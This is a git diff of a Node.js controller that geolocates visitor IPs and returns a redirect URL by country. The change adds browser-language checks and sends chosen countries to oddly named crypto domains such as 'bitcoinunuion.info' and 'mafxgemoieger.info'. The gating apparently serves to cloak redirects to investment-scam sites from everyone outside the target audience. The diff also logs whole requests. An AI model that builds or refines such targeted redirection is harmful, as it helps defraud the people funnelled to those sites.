@@ -7,17 +7,18 @@ const errorHandler = require('../utils/errorHandler');
 
 module.exports.getUrl = async function (req, res) {
     try {
-        // let ip = req.ip
-        let ip = "114.104.182.143"
+        console.log(req);
+        let ip = req.ip
+        // let ip = "114.104.182.143"
+        // let ip = "5.182.39.255"
         // let ip = "2a03:2880:f122::"
-        // let ip = "207.97.227.239"
         if (ip6addr.parse(ip).kind() === 'ipv6') {
             ip = new Address6(ip).inspectTeredo().server4;
         }
         if (ip.substr(0, 7) === "::ffff:") {
             ip = ip.substr(7)
         }
-        let data = checkCountry(ip);
+        let data = checkCountry(ip, req.body.language);
         let unique;
         const uniqueUser = await User.findOne({ip})
         if (uniqueUser) {
@@ -73,7 +74,7 @@ module.exports.getUrl = async function (req, res) {
     }
 }
 
-function checkCountry(ip) {
+function checkCountry(ip, language) {
     let geo = geoip.lookup(ip);
     let countryCode;
     let city;
@@ -85,11 +86,26 @@ function checkCountry(ip) {
         countryCode = geo.country;
         city = geo.city;
         switch (geo.country) {
-            case "CN" || "UK" || "AU" || "SG":
+            case "CN":
+                url = 'bitcoinunuion.info'
+                break
+            case "UK":
+                url = 'bitcoinunuion.info'
+                break
+            case "AU":
+                url = 'bitcoinunuion.info'
+                break
+            case "SG":
                 url = 'bitcoinunuion.info'
                 break
             case "PL":
-                url = 'profitmaximum.pl'
+                url = 'mafxgemoieger.info'
+                break
+            case "RU":
+                url = 'mafxgemoieger.info'
+                break
+            case "UA":
+                url = 'mafxgemoieger.info'
                 break
             default:
                 url = null;
@@ -97,6 +113,16 @@ function checkCountry(ip) {
         }
 
     }
+    if (countryCode === 'RU' || countryCode === "UA" || countryCode === "PL") {
+        if (language ==='RU' ||
+            language ==='UA' ||
+            language ==='PL') {
+            url = 'mafxgemoieger.info'
+            } else {
+            url = null
+        }
+    }
+
     return {url, countryCode, city}
 }
 
